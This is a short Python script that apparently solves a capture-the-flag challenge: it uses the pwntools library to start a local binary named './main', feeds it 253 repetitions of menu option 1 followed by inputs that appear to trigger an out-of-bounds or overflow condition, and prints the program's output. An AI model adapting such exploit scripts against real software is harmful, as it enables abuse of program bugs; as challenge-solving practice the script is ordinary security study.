from pwn import *
p = process("./main")
p.send(b"1\n" * 253 + b"2\n3\n256\n4\n")
print(p.recvall().decode())
